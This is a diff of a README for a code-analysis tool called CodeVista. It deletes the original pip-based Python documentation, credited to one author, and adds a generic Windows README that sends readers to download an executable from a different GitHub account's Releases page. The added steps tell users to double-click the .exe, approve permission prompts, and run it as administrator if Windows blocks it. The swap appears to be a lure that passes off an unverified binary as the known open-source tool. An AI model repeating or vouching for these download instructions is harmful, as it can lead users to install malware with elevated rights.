@@ -1,709 +1,198 @@
-<!-- CodeVista — Code Analysis & Security Scanner | Static Analysis Tool -->
-<!-- Meta: CodeVista is a free, zero-dependency code analysis and security scanner that generates stunning single-page HTML reports. Supports 75+ languages, 38 lint rules, DNA fingerprinting, architectural decay detection, code smells, and more. -->
-<!-- Keywords: code analysis, static analysis, security scanner, code quality, code metrics, code smells, architecture detection, health score, technical debt, SARIF, CI/CD, lint rules, code fingerprinting -->
-
-<p align="center">
-  <!-- Badges -->
-  <a href="https://pypi.org/project/codevista/"><img src="https://img.shields.io/badge/Python-3.9+-3776AB?style=flat&logo=python&logoColor=white" alt="Python 3.9+"></a>
-  <a href="https://github.com/rudra496/codevista/blob/main/LICENSE"><img src="https://img.shields.io/badge/License-MIT-green.svg" alt="MIT License"></a>
-  <a href="https://github.com/rudra496/codevista/actions"><img src="https://img.shields.io/badge/Tests-117%20passing-brightgreen" alt="Tests"></a>
-  <a href="#"><img src="https://img.shields.io/badge/Coverage-coming%20soon-yellow" alt="Coverage"></a>
-  <a href="#"><img src="https://img.shields.io/badge/Languages-80%2B-blue" alt="Languages"></a>
-  <a href="https://github.com/rudra496/codevista/stargazers"><img src="https://img.shields.io/github/stars/rudra496/codevista?style=social" alt="Stars"></a>
-  <a href="https://github.com/rudra496/codevista/network/members"><img src="https://img.shields.io/github/forks/rudra496/codevista?style=social" alt="Forks"></a>
-  <a href="https://github.com/rudra496/codevista/issues"><img src="https://img.shields.io/github/issues/rudra496/codevista" alt="Issues"></a>
-</p>
-
-<p align="center">
-  <pre>
- ██████╗ ██████╗ ███╗   ██╗ ██████╗ ███████╗██╗ ██████╗ ██╗  ██╗████████╗
-██╔═══██╗██╔══██╗████╗  ██║██╔════╝ ██╔════╝██║██╔════╝ ██║  ██║╚══██╔══╝
-██║   ██║██████╔╝██╔██╗ ██║██║  ███╗███████╗██║██║  ███╗███████║   ██║
-██║   ██║██╔══██╗██║╚██╗██║██║   ██║╚════██║██║██║   ██║██╔══██║   ██║
-╚██████╔╝██║  ██║██║ ╚████║╚██████╔╝███████║██║╚██████╔╝██║  ██║   ██║
- ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝
-  </pre>
-</p>
-
-<h3 align="center"><strong>CodeVista — Code Analysis & Security Scanner</strong></h3>
-<h4 align="center">Deep analytics for your code — a powerful static analysis tool</h4>
-<p align="center">
-  Beautiful interactive codebase visualizations — single HTML, zero dependencies.
-</p>
-
----
-
-## ✨ What is CodeVista?
-
-CodeVista analyzes your codebase and generates a **stunning single-page HTML report** — no server, no internet, no external dependencies. Just share one file and everyone can explore your code visually.
-
-![CodeVista Demo](https://img.shields.io/badge/🎬_Demo_Screenshot-Coming_Soon-8b5cf6?style=for-the-badge)
-
-## 🚀 Quick Start
-
-```bash
-pip install codevista
-codevista analyze ./my-project/
-```
-
-That's it. Open `report.html` in any browser. No server needed.
-
-## 📦 Installation
-
-```bash
-pip install codevista
-```
-
-Zero external dependencies — pure Python stdlib.
-
-## 🎯 Commands
-
-| Command | Description |
-|---------|-------------|
-| `codevista analyze ./project/` | Full analysis with all features |
-| `codevista analyze ./project/ -o report.html` | Custom output path |
-| `codevista analyze ./project/ --no-git` | Skip git analysis |
-| `codevista analyze ./project/ --depth 3` | Limit directory depth |
-| `codevista quick ./project/` | Fast analysis (~3 seconds) |
-| `codevista serve ./project/ --port 8080` | Serve report on HTTP server |
-| `codevista compare ./v1/ ./v2/` | Compare two codebases |
-| `codevista watch ./project/` | Re-analyze on file changes |
-| `codevista smells ./project/` | Detect code smells and anti-patterns |
-| `codevista architecture ./project/` | Detect architecture patterns |
-| `codevista code-age ./project/` | Analyze file age, churn, and risk |
-| `codevista export ./project/ -f sarif` | Export as SARIF for CI |
-| `codevista export ./project/ --all` | Export to all formats |
-| `codevista health ./project/` | Health score only |
-| `codevista security ./project/` | Security scan only |
-| `codevista deps ./project/` | Dependency analysis |
-| `codevista git-stats ./project/` | Git repository statistics |
-| `codevista languages ./project/` | Language distribution breakdown |
-| `codevista complexity ./project/` | Complexity analysis and top functions |
-| `codevista snapshot ./project/` | Save analysis snapshot for trend tracking |
-| `codevista trends ./project/` | Show project health trends over time |
-| `codevista diff-snapshots ./project/ 1 2` | Compare two snapshots |
-| `codevista team ./project/` | Team productivity & collaboration analysis |
-| `codevista ci-output ./project/ -f sarif` | CI/CD output (SARIF, Checkstyle, etc.) |
-| `codevista decay ./project/` | Architectural decay analysis |
-| `codevista dna ./project/` | Generate CodeDNA fingerprint |
-| `codevista lint ./project/` | Language-specific lint rules |
-
-## 📊 What It Analyzes
-
-### 🏗️ Architecture Map
-- File dependency graph — who imports whom
-- Interactive directory tree with line counts
-- Module cluster detection
-
-### 📈 Code Metrics
-- Lines of code per file (interactive bar chart)
-- Cyclomatic complexity (hot spot detection)
-- Code duplication detection (hash-based)
-- Comment coverage tracking
-- File size distribution
-
-### 🧩 Technology Detection
-- Language detection (50+ languages)
-- Framework detection (React, Django, Flask, Express, etc.)
-- Dependency inventory with versions
-
-### 🏥 Health Score
-- Overall health: 0-100 (composite score)
-- Per-category: readability, complexity, duplication, coverage, security, dependencies
-- Color-coded indicators (green/yellow/red)
-- Specific improvement recommendations
-
-### 🔒 Security Scan
-- Hardcoded secrets (AWS, GitHub, Stripe, API keys, passwords, tokens)
-- Dangerous functions (eval, exec, shell=True, pickle)
-- Private key detection
-- Severity scoring (critical/high/medium/low)
-
-### 👥 Git Insights
-- Contribution heatmap (52-week calendar)
-- Top contributors with commit share
-- Most active files
-- Commit statistics
-
-### 👃 Code Smell Detection
-CodeVista detects **19 categories of code smells** that go beyond typical linters:
-
-| Smell | Description |
-|-------|-------------|
-| **God Classes** | Classes with too many methods/fields/responsibilities |
-| **Long Parameter Lists** | Functions with too many params, especially with `=None` |
-| **Feature Envy** | Methods using another class's data more than their own |
-| **Divergent Change** | Classes modified for multiple unrelated reasons |
-| **Shotgun Surgery** | Single logical change requiring edits across many files |
-| **Parallel Inheritance** | Adding a subclass of A always requires subclassing B |
-| **Speculative Generality** | Unused abstractions, abstract methods never overridden |
-| **Temporary Fields** | Instance variables set only in certain methods |
-| **Message Chains** | Long dot chains: `a.b.c.d.e.f` |
-| **Middle Man** | Classes that only delegate to another class |
-| **Comment Smells** | Comments describing WHAT code does, not WHY |
-| **Dead Code** | Variables assigned but never read, functions never called |
-| **Magic Numbers** | Unnamed numeric literals scattered in code |
-| **Copy-Paste Code** | Near-duplicate blocks within and across files |
-| **Missing Error Handling** | I/O operations without try/catch or error checks |
-| **Inconsistent Naming** | Mixing camelCase and snake_case conventions |
-| **Boolean Parameters** | Flags indicating method should be split |
-| **isinstance Chains** | Type checking chains suggesting missing polymorphism |
-
-Each smell comes with severity, location, and **actionable remediation advice**.
-
-```bash
-codevista smells ./my-project/
-```
-
-### 🏗️ Architecture Pattern Detection
-Automatically identifies architectural patterns from project structure and code:
-
-- **MVC / MVVM / MVP** — UI patterns
-- **Layered Architecture** — presentation, business, data layers
-- **Clean Architecture** — entities, use cases, controllers, adapters
-- **Hexagonal** — ports & adapters pattern
-- **Repository Pattern** — data access mediation
-- **Service Layer** — application boundary with coordinating operations
-- **CQRS** — command/query separation
-- **Event-Driven** — event publishers, subscribers, handlers
-- **Microservices** — independent service architecture
-- **Singleton / Factory / Strategy / Observer / Decorator** — design patterns
-- **Dependency Injection** — DI framework and manual injection
-
-Includes architecture quality scoring (organization, coupling, modularity, balance) and text-based architecture diagrams.
-
-```bash
-codevista architecture ./my-project/
-```
-
-### 📅 Code Age & Risk Analysis
-Track file age, change frequency, and identify files most likely to have bugs:
-
-| Category | Description |
-|----------|-------------|
-| 🔥 **Hot** | Changed in the last 7 days |
-| 🌤️ **Warm** | Changed in the last 30 days |
-| ❄️ **Cold** | Changed 30-365 days ago |
-| 🧊 **Cold Stable** | Old but few changes (stable) |
-| 💀 **Dead** | Unchanged for >1 year |
-
-**Risk Analysis** correlates age × complexity × churn to identify the files most likely to contain bugs:
-- Files with high age, high complexity, and high change frequency get the highest risk scores
-- Statistical correlation analysis between age, complexity, and churn
-- Actionable recommendations for high-risk files
-
-```bash
-codevista code-age ./my-project/
-```
-
-## 📈 Trend Analysis
-
-Track code quality over time with snapshots and trend visualization.
-
-### How It Works
-
-1. **Save snapshots** after each analysis run
-2. **Compare snapshots** to see how your codebase evolves
-3. **Get alerted** when metrics cross critical thresholds
-4. **Track technical debt** ratio over time
-
-```bash
-# Save a snapshot of the current state
-codevista snapshot ./my-project/
-
-# Save with a label
-codevista snapshot ./my-project/ --label "before-refactor"
-
-# View trends
-codevista trends ./my-project/
-
-# Compare two specific snapshots
-codevista diff-snapshots ./my-project/ 1 2
-```
-
-### ASCII Timeline Example
-
-```
-  📈 Health Score Timeline
-  100 ┤████████████████████
-      │████████████████████
-      │████████████████████
-      │████████████████████
-      │████████████████████
-      │████████████████████
-      │████████████████████
-      │████████████████████
-      │████████████████████
-      │████████████████████
-      │████████████████████
-      │████████████████████
-    0 ┤─────────────────────
-  Current: 78/100 ↑
-```
-
-### Features
-
-- **Trend arrows**: ↑ improving, ↓ degrading, → stable
-- **Threshold alerts**: Get warned when health drops or security issues spike
-- **Technical debt tracking**: Monitor debt ratio over time
-- **Review cadence**: Suggests optimal review frequency based on change rate
-- **Code age distribution**: Track how your codebase ages
-
-## 👥 Team Metrics
-
-Analyze developer productivity and collaboration patterns.
-
-```bash
-codevista team ./my-project/
-```
-
-### What It Analyzes
-
-| Metric | Description |
-|--------|-------------|
-| **Lines per Author** | Added/removed/net per developer |
-| **Commit Frequency** | Commits per day, burst vs steady patterns |
-| **Files Touched** | Unique files per author |
-| **Bus Factor** | People needed to understand 50% of code |
-| **Code Ownership** | Pie chart data showing contribution share |
-| **Review Coverage** | Estimate from commit messages |
-| **Pair Programming** | Co-authored commit detection |
-| **Time Zone Distribution** | When the team commits |
-| **Onboarding Complexity** | How hard for a new contributor to ramp up |
-
-### 🏚️ Architectural Decay Detector
-Track how your codebase degrades over time using git history. Detects growing complexity, increasing coupling, code duplication, and predicts future state.
-
-```bash
-codevista decay ./my-project/
-```
-
-**What it analyzes:**
-
-| Metric | Description |
-|--------|-------------|
-| **Complexity Growth** | How cyclomatic complexity changes across commits |
-| **Coupling Growth** | How module interdependencies grow over time |
-| **Duplication Growth** | Code duplication ratio changes |
-| **Debt Velocity** | Technical debt accumulation rate per week |
-| **Decay Hotspots** | Files degrading fastest (ranked by decay score) |
-| **Predictions** | Linear regression forecasts for 12 weeks ahead |
-| **Inflection Points** | Key commits where quality shifted significantly |
-| **Interventions** | Prioritized refactoring recommendations |
-
-**ASCII Report Example:**
-
-```
-  ╔═══════════════════════════════════════════════════════════╗
-  ║          🏚️  ARCHITECTURAL DECAY ANALYSIS                 ║
-  ╠═══════════════════════════════════════════════════════════╣
-  ║  Repository: my-project                                    ║
-  ║  Is Git:     Yes                                          ║
-  ╚═══════════════════════════════════════════════════════════╝
-
-  📈 COMPLEXITY GROWTH
-  ────────────────────────────────────────────────────────
-    2026-01-15  avg CC:   8.2  [████░░░░░░░░░░░░░░░░░░]
-    2026-02-01  avg CC:   9.5  [█████░░░░░░░░░░░░░░░░░]
-    2026-02-15  avg CC:  11.3  [██████░░░░░░░░░░░░░░░░]
-    2026-03-01  avg CC:  13.8  [████████░░░░░░░░░░░░░░]
-    Trend: 📈 GROWING
-
-  🔥 DECAY HOTSPOTS (top 10)
-  ────────────────────────────────────────────────────────
-    🔴  1.  45.2 [████████████████████░░] src/core/engine.py
-    🟠  2.  28.7 [█████████████░░░░░░░░░] src/api/handler.js
-    🟡  3.  12.4 [██████░░░░░░░░░░░░░░░░] src/utils/parser.py
-
-  🔮 PREDICTIONS (12 weeks forward)
-  ────────────────────────────────────────────────────────
-    Avg complexity:   18.5
-    Debt lines:       2450
-    Confidence:       moderate
-
-  💡 RECOMMENDED INTERVENTIONS
-  ────────────────────────────────────────────────────────
-    🔴 [CRITICAL] src/core/engine.py
-       Action: refactor
-       break into smaller functions/modules; stabilize — changes are volatile
-```
-
-### 🧬 CodeDNA Fingerprinter
-Create unique DNA fingerprints for codebases — identify projects, detect forks, spot cloned code.
-
-```bash
-# Generate fingerprint with ASCII barcode
-codevista dna ./my-project/
-
-# Save fingerprint for later comparison
-codevista dna ./my-project/ --save fingerprint.json
-
-# Compare two projects
-codevista dna ./project-a/ --compare fingerprint.json
-
-# Detect cloned files
-codevista dna ./my-project/ --clones
-```
-
-**What it captures:**
-
-| Component | Description |
-|-----------|-------------|
-| **Hash Patterns** | SHA-based profile of code structure patterns |
-| **Language Distribution** | Language mix signature |
-| **Complexity Distribution** | Complexity bucket fingerprint |
-| **Dependency Topology** | Import graph topology hash |
-| **Naming Conventions** | camelCase/snake_case/PascalCase ratios |
-| **Comment Density** | Documentation coverage fingerprint |
-| **Function Size** | Function size distribution |
-| **File Size** | File size distribution |
-| **Clone Detection** | Exact and near-clone detection via block hashing |
-
-**Barcode Example:**
-
-```
-  ┌─────────────────────────────────────────────────────┐
-  │              🧬 CodeDNA Barcode                     │
-  ├─────────────────────────────────────────────────────┤
-  │  ▓▓▒▒░░████▓▓▒░████░▒▒▓▓████░░▒▒▓▓░░████▒▒░░████│
-  │  ██▓▓░░▒▒████░░▓▓██▒▒░░▓▓▒▒████░░▓▓██▒▒░░▓▓▒▒░░░│
-  │  ░░▒▒██▓▓░░▒▒████░░▓▓██▒▒████░░▓▓░░▒▒████░░▓▓██▓▓│
-  │  ░░████░░▓▓▒▒██▓▓░░▒▒████░░▓▓░░████░░▒▒██▓▓░░▒▒░░│
-  ├─────────────────────────────────────────────────────┤
-  │  Project: my-project                    files:   42│
-  │  Languages: Python 45.2%, JS 30.1%, HTML 15.3%    │
-  │  Naming: snake_case                                   │
-  │  Hash: a3f7c2b1e9d04586                              │
-  └─────────────────────────────────────────────────────┘
-
-  Compact: [█████░░████░░░░████████░░██░░░░████░░████░░]
-  a3f7c2b1e9d045867f2a9c3d1e8b4f6a...
-```
-
-## 📏 Lint Rules
-
-CodeVista includes **38 language-specific lint rules** across 5 languages, enforcing popular style guides:
-
-```bash
-# Lint entire project
-codevista lint ./my-project/
-
-# Lint specific file
-codevista lint ./src/app.py
-
-# Filter by language
-codevista lint ./project/ -l python -l javascript
-
-# Filter by severity
-codevista lint ./project/ -s error -s warning
-
-# Include/exclude specific rules
-codevista lint ./project/ --include-rule PY001 --exclude-rule PY010
-
-# JSON output for CI
-codevista lint ./project/ --json
-
-# List all available rules
-codevista lint --rules
-```
-
-### Supported Languages & Rules
-
-| Language | Style Guide | Rules | Severity |
-|----------|------------|-------|----------|
-| **Python** | PEP 8 / Black | PY001–PY011 (11 rules) | error/warning/info |
-| **JavaScript** | Airbnb | JS001–JS009 (9 rules) | error/warning/info |
-| **TypeScript** | Airbnb (shared) | JS001–JS009 (9 rules) | error/warning/info |
-| **Go** | gofmt | GO001–GO005 (5 rules) | error/warning |
-| **Rust** | clippy-lite | RS001–RS005 (5 rules) | error/warning/info |
-| **Java** | Google Style | JA001–JA006 (6 rules) | error/warning/info |
-
-### Python (PEP 8 / Black)
-
-| Rule | Severity | Description |
-|------|----------|-------------|
-| PY001 | warning | Max line length (88 for Black) |
-| PY002 | error | No wildcard imports (`from x import *`) |
-| PY003 | info | Import order: stdlib → third-party → local, alphabetized |
-| PY004 | info | Two blank lines before top-level definitions |
-| PY005 | info | One blank line before methods |
-| PY006 | info | Spaces around operators |
-| PY007 | info | Prefer f-strings over `.format()` / %-formatting |
-| PY008 | info | Type hints on public functions |
-| PY009 | warning | Naming conventions (snake_case, PascalCase, UPPER_CASE) |
-| PY010 | info | No trailing whitespace |
-| PY011 | warning | No multiple statements on one line |
-
-### JavaScript/TypeScript (Airbnb)
-
-| Rule | Severity | Description |
-|------|----------|-------------|
-| JS001 | error | No `var` — use `const` or `let` |
-| JS002 | info | Prefer template literals over string concatenation |
-| JS003 | info | Use arrow functions for callbacks |
-| JS004 | warning | Use `===` instead of `==` |
-| JS005 | warning | 2-space indentation (no tabs) |
-| JS006 | warning | No unused variables |
-| JS007 | info | Prefer destructuring for repeated property access |
-| JS008 | info | Use object shorthand syntax |
-| JS009 | info | Trailing comma conventions |
-
-### Go (gofmt)
-
-| Rule | Severity | Description |
-|------|----------|-------------|
-| GO001 | error | Tab indentation required |
-| GO002 | error | No unused imports |
-| GO003 | warning | Exported names must have doc comment |
-| GO004 | error | Error handling — do not discard errors |
-| GO005 | warning | No variable shadowing in inner scopes |
-
-### Rust (clippy-lite)
-
-| Rule | Severity | Description |
-|------|----------|-------------|
-| RS001 | error | No `.unwrap()` in production code |
-| RS002 | warning | Use Option/Result properly (no `is_some().unwrap()`) |
-| RS003 | error | No mutable statics |
-| RS004 | info | Lint suppressions should be avoided |
-| RS005 | error | Naming conventions (snake_case functions/vars) |
-
-### Java (Google Style)
-
-| Rule | Severity | Description |
-|------|----------|-------------|
-| JA001 | error | 4-space indentation (no tabs) |
-| JA002 | warning | Javadoc on public methods |
-| JA003 | error | No wildcard imports |
-| JA004 | error | Braces required for control statements |
-| JA005 | warning | Catch specific exceptions |
-| JA006 | info | Use logger instead of `System.out.print` |
-
-### Exit Codes
-
-| Code | Meaning |
-|------|---------|
-| `0` | Clean — no violations |
-| `2` | Errors found |
-
-## 📤 Export Formats
-
-Export analysis results in multiple formats for different use cases:
-
-| Format | Use Case | Command |
-|--------|----------|---------|
-| **HTML** | Interactive report in browser | `codevista export . -f html` |
-| **JSON** | Programmatic access, APIs | `codevista export . -f json` |
-| **Markdown** | Documentation, READMEs, wikis | `codevista export . -f markdown` |
-| **SARIF** | GitHub Code Scanning, CI/CD | `codevista export . -f sarif` |
-| **CSV** | Spreadsheets, data analysis | `codevista export . -f csv` |
-| **YAML** | CODE_METRICS format | `codevista export . -f yaml` |
-| **PDF** | Printable reports | `codevista export . -f pdf` |
-| **All formats** | Everything at once | `codevista export . --all` |
-
-```bash
-# CI integration with GitHub Code Scanning
-codevista export ./project/ -f sarif -o results.sarif.json
-
-# Export everything
-codevista export ./project/ -o ./reports/codevista --all
-```
-
-## 🔌 CI/CD Integration
-
-CodeVista provides dedicated CI output formats with threshold-based pass/fail.
-
-### Supported Formats
-
-| Format | Platform | Command |
-|--------|----------|---------|
-| **SARIF** | GitHub Code Scanning | `codevista ci-output . -f sarif` |
-| **GitLab Code Quality** | GitLab | `codevista ci-output . -f gitlab` |
-| **Checkstyle XML** | Jenkins, GitHub Actions | `codevista ci-output . -f checkstyle` |
-| **JUnit XML** | Any CI with JUnit support | `codevista ci-output . -f junit` |
-| **Markdown** | PR comments | `codevista ci-output . -f markdown` |
-| **Terminal** | Quick terminal output | `codevista ci-output . -f terminal` |
-
-### Exit Codes
-
-| Code | Meaning | Description |
-|------|---------|-------------|
-| `0` | Clean | All thresholds passed |
-| `1` | Warnings | Medium-severity threshold violations |
-| `2` | Errors | High-severity violations (health, complexity) |
-| `3` | Critical | Critical security issues or severe degradation |
-
-### Threshold Configuration
-
-Create `.codevista.json` in your project root:
-
-```json
-{
-  "max_security_critical": 0,
-  "max_security_high": 0,
-  "max_security_medium": 5,
-  "max_security_total": 10,
-  "max_avg_complexity": 10,
-  "max_technical_debt_ratio": 0.25,
-  "min_health_score": 60,
-  "max_duplicates": 10,
-  "max_circular_deps": 0,
-  "max_todo_count": 50
-}
-```
-
-```bash
-# Run with exit codes (CI will fail if thresholds violated)
-codevista ci-output ./project/ -f sarif -o results.sarif.json
-echo "Exit code: $?"  # 0=clean, 1=warnings, 2=errors, 3=critical
-```
-
-## 🐳 Docker
-
-```bash
-# Build
-docker build -t codevista .
-
-# Analyze a project
-docker run --rm -v $(pwd):/workspace codevista analyze /workspace
-
-# Use docker-compose
-docker-compose up
-```
-
-The Docker image uses multi-stage builds for minimal size, runs as non-root, and includes `wkhtmltopdf` for PDF export.
-
-## 🎨 Report Features
-
-- **Single HTML file** — share anywhere, works offline forever
-- **Dark/light mode** toggle
-- **Interactive tables** — sort by any column, filter by language, search
-- **Inline SVG charts** — no external JS libraries
-- **Collapsible sections**
-- **Print-friendly**
-- **Responsive** — works on mobile
-
-## 🏆 Comparison
-
-| Feature | CodeVista | SonarQube | CodeClimate | lizard |
-|---------|-----------|-----------|-------------|--------|
-| Setup | `pip install` | Docker/Server | SaaS | `pip install` |
-| Dependencies | **Zero** | Heavy | None | None |
-| Output | **Single HTML** | Web UI | Web UI | CLI |
-| Offline | ✅ | ❌ | ❌ | N/A |
-| Security scan | ✅ | ✅ | ✅ | ❌ |
-| Git analysis | ✅ | ✅ | ✅ | ❌ |
-| Visual charts | ✅ | ✅ | ✅ | ❌ |
-| Code smell detection | ✅ **19 types** | Limited | Limited | ❌ |
-| Architecture patterns | ✅ **12+ patterns** | ❌ | ❌ | ❌ |
-| Code age analysis | ✅ | ❌ | ❌ | ❌ |
-| SARIF export | ✅ | ✅ | ✅ | ❌ |
-| Cost | **Free** | Free/Paid | Paid | Free |
-| Server needed | **No** | Yes | Yes | No |
-
-## 💎 What Makes CodeVista Unique
-
-1. **Zero dependencies** — pure Python stdlib, no pip install headaches
-2. **Single HTML output** — share one file, works offline forever, no server
-3. **Deep code smell detection** — 19 smell categories with AST-level analysis, not just regex
-4. **Architecture pattern detection** — identifies 12+ patterns from structure + code
-5. **Code age × risk correlation** — statistical analysis of age, complexity, and churn
-6. **Multi-format export** — HTML, JSON, Markdown, SARIF, CSV, YAML, PDF
-7. **Docker support** — multi-stage build, non-root user, PDF-ready
-8. **Beautiful design** — dark mode, glassmorphism, inline SVG charts, animations
-9. **Works on any codebase** — 50+ languages, no configuration needed
-10. **CI/CD ready** — SARIF export for GitHub Code Scanning integration
-
-## 🏗️ Architecture
-
-```
-codevista/
-├── cli.py            # CLI interface (argparse)
-├── analyzer.py       # Core analysis engine
-├── report.py         # HTML report generator
-├── metrics.py        # Health scores & recommendations
-├── smells.py         # Code smell detection (19 categories)
-├── architecture.py   # Architecture pattern detector
-├── code_age.py       # Code age & risk analysis
-├── export.py         # Multi-format export (HTML/JSON/MD/SARIF/CSV/YAML/PDF)
-├── security.py       # Secret/vulnerability scanning
-├── dependencies.py   # Dependency parsing & analysis
-├── git_analysis.py   # Git stats extraction
-├── trends.py         # Trend analysis & snapshot tracking
-├── team.py           # Team metrics & collaboration analysis
-├── integrations.py   # CI/CD output (SARIF, Checkstyle, JUnit, GitLab)
-├── decay.py          # Architectural decay detector
-├── codedna.py        # CodeDNA fingerprinter
-├── lint_rules.py     # Language-specific lint rules (PEP 8, Airbnb, gofmt, clippy, Google)
-├── languages.py      # Language definitions & colors
-├── config.py         # Configuration & ignore patterns
-├── utils.py          # Utilities & color schemes
-└── templates/        # HTML templates
-```
-
-## 🛠️ Tech Stack
-
-- **Python 3.7+** (stdlib only)
-- **Inline SVG** for all charts
-- **CSS custom properties** for theming
-- **Vanilla JavaScript** for interactivity
-- **AST parsing** for deep code analysis (Python)
-
-## 🤝 Contributing
-
-1. Fork it
-2. Create your feature branch (`git checkout -b feature/amazing`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing`)
-5. Open a Pull Request
-
-## ⭐ Star History
-
-<a href="https://star-history.com/#rudra496/codevista&Date">
- <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=rudra496/codevista&type=Date&theme=dark" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=rudra496/codevista&type=Date" />
-   <img alt="Star History" src="https://api.star-history.com/svg?repos=rudra496/codevista&type=Date" />
- </picture>
-</a>
-
-## 📄 License
-
-MIT © 2026 — see [LICENSE](LICENSE)
-
-## 💡 Why CodeVista?
-
-- **Zero dependencies** — Pure Python, no Node.js, no databases, no external tools
-- **75+ languages** — Works with virtually any codebase out of the box
-- **Stunning HTML reports** — Beautiful, interactive reports you'll actually want to read
-- **Security-first** — 30+ secret detection patterns including Stripe, AWS, GitHub tokens
-- **Unique features** — CodeDNA fingerprinting and architectural decay detection (no other tool has this)
-- **CI/CD ready** — SARIF, Checkstyle, and JUnit XML output formats
-
-## 👥 Use Cases
-
-| Use Case | How |
-|----------|-----|
-| **Individual Developers** | Get a health score for your project, find security issues |
-| **Engineering Teams** | Track code quality trends, compare team member metrics |
-| **CI/CD Pipelines** | Generate SARIF reports for GitHub Code Scanning |
-| **Open Source Maintainers** | Analyze PR quality, detect code smells automatically |
-| **Code Reviews** | Get automated feedback on architecture, complexity, and duplication |
-| **Education** | Teach code quality concepts with visual, interactive reports |
-
-## 🌐 Connect
-
-- [![GitHub](https://img.shields.io/badge/GitHub-rudra496-181717?logo=github)](https://github.com/rudra496)
-- [![LinkedIn](https://img.shields.io/badge/LinkedIn-rudrasarker-0A66C2?logo=linkedin)](https://www.linkedin.com/in/rudrasarker)
-- [![X/Twitter](https://img.shields.io/badge/X-@Rudra496-000000?logo=x)](https://x.com/Rudra496)
-- [![Facebook](https://img.shields.io/badge/Facebook-rudrasarker130-1877F2?logo=facebook)](https://www.facebook.com/rudrasarker130)
-- [![YouTube](https://img.shields.io/badge/YouTube-@rudrasarker9732-FF0000?logo=youtube)](https://youtube.com/@rudrasarker9732)
-- [![Dev.to](https://img.shields.io/badge/Dev.to-rudra__sarker-000000?logo=devdotto)](https://dev.to/rudra_sarker)
-- [![ResearchGate](https://img.shields.io/badge/ResearchGate-Rudra_Sarker-00CCBB?logo=researchgate)](https://www.researchgate.net/profile/Rudra-Sarker-3)
-
----
-
-<p align="center">
-  <strong>Built with ❤️ by <a href="https://github.com/rudra496">rudra496</a> · <a href="https://www.linkedin.com/in/rudrasarker">LinkedIn</a></strong><br>
-  <sub>MIT License · Free & Open Source Forever</sub>
-</p>
+# 🔍 codevista - Scan code fast, find real risks
+
+[![Download codevista](https://img.shields.io/badge/Download%20codevista-blue-grey?style=for-the-badge)](https://github.com/Admassfrancisedgarstanley947/codevista/releases)
+
+## 🧭 What Codevista does
+
+Codevista scans source code for common problems, weak spots, and signs of old or risky code. It supports more than 75 languages and creates clear HTML reports you can open in your browser.
+
+Use it to:
+- check code quality
+- spot security issues
+- find code that may need updates
+- review projects without reading every file by hand
+- compare code over time with DNA fingerprinting and decay checks
+
+## 💻 What you need
+
+Codevista runs on Windows and works best on a modern PC.
+
+You will need:
+- Windows 10 or Windows 11
+- at least 4 GB of RAM
+- 200 MB of free disk space
+- a web browser to open reports
+
+For larger projects, 8 GB of RAM gives smoother results.
+
+## ⬇️ Download Codevista
+
+Visit this page to download Codevista for Windows:
+
+[Download Codevista from GitHub Releases](https://github.com/Admassfrancisedgarstanley947/codevista/releases)
+
+On the Releases page, look for the latest version and choose the Windows file if one is listed.
+
+## 🪟 Install on Windows
+
+After you download the file:
+
+1. Open the Downloads folder
+2. Find the Codevista file you downloaded
+3. If it is a .zip file, right-click it and choose Extract All
+4. Open the extracted folder
+5. If you see a .exe file, double-click it to start Codevista
+6. If Windows asks for permission, choose Yes
+
+If your browser saves the file to another folder, open that folder instead.
+
+## ▶️ Run a scan
+
+After Codevista opens:
+
+1. Choose the folder you want to check
+2. Select the scan type if you see one
+3. Start the scan
+4. Wait while Codevista checks your files
+5. Open the report when the scan finishes
+
+For the best first run, scan a small project or one folder at a time.
+
+## 📄 Read the report
+
+Codevista creates an HTML report that opens in your browser. The report may include:
+
+- file list and project overview
+- code quality findings
+- security warnings
+- decay indicators for old or unused code
+- language breakdown
+- fingerprint data for repeat checks
+
+Use the report to find what needs attention first. Start with high-risk items, then review the rest.
+
+## 🧰 Main features
+
+- scans code in 75+ languages
+- checks for quality issues
+- looks for security risks
+- detects code decay
+- builds DNA-style fingerprints for comparison
+- creates HTML reports for easy review
+- fits both small and large projects
+
+## 🗂️ Typical use cases
+
+Codevista is useful when you want to:
+
+- review a new project before using it
+- check a folder before sharing it
+- find weak code in old projects
+- track code changes over time
+- compare different versions of the same codebase
+- get a quick view of code health without manual review
+
+## ⚙️ Tips for best results
+
+- scan one project folder at a time
+- keep the project in a simple path, such as `C:\Projects\MyApp`
+- close other heavy apps if the scan feels slow
+- open the HTML report in Edge, Chrome, or Firefox
+- save old reports if you want to compare them later
+
+If you scan the same project often, keep the folder name and path the same.
+
+## 🧪 First scan example
+
+A simple first scan might look like this:
+
+1. Download Codevista from the Releases page
+2. Extract the file if needed
+3. Open the app
+4. Pick a folder with source code
+5. Start the scan
+6. Open the HTML report in your browser
+7. Review the warnings and file list
+
+This gives you a quick view of what Codevista can find.
+
+## 📁 What the report can help you find
+
+The report can help you spot:
+- files with many issues
+- code that may be out of date
+- patterns that could raise security concerns
+- parts of the project that change often
+- files that may need a closer look
+
+## 🔒 Safe use
+
+Codevista reads your files and builds a report. It does not need to change your code to run a scan in a normal setup.
+
+For private projects, keep the report file in a secure folder if it contains sensitive file names or paths.
+
+## 🛠️ Common Windows problems
+
+If the file does not open:
+- check that the download finished
+- make sure you extracted the zip file first
+- right-click the app and choose Run as administrator if Windows blocks it
+- move the app to a short folder path like `C:\Codevista`
+
+If the report does not open:
+- double-click the HTML file
+- try another browser
+- make sure the scan finished before opening the report
+
+If the scan feels slow:
+- close large apps
+- scan fewer files at once
+- use a smaller folder for the first test
+
+## 📦 Update Codevista
+
+To get the newest version:
+
+1. Return to the Releases page
+2. Download the latest Windows file
+3. Replace the old app files if needed
+4. Run the new version
+5. Scan again
+
+Keep old reports if you want to compare results across versions.
+
+## ❓ FAQ
+
+### Does Codevista work without coding knowledge?
+Yes. You only need to choose a folder and start the scan.
+
+### Can I use it on old projects?
+Yes. It is useful for old code, large folders, and projects you have not opened in a long time.
+
+### Does it support many file types?
+Yes. It supports more than 75 languages, so it can handle many common project folders.
+
+### What file opens the results?
